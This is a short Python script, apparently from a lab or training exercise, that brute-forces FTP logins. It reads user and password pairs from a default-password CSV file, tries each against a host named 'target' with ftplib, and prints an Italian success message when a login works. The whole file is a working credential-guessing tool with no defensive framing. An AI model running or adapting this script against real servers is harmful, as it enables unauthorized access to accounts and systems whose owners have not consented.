import ftplib
import sys
import itertools
import csv
# TARGET credentials: (admin,admin123)
users = ['superman','admin']
passwords = ['ciao monodo','password','password12345']
loginlist = itertools.product(users,passwords)
with open('default-passwords.csv') as file:
    loginlist = ((user,passwd) for _,user,passwd,_ in list(csv.reader(file)))
    for user,passwd in loginlist:
        try:
            conn = ftplib.FTP('target')
            conn.login(user,passwd)
            print(f'\n***BRUTEFORCE RIUSCITO USER={user} PASS={passwd}')
            break
        except:
            conn.close()
            print('.',end='')
            sys.stdout.flush()
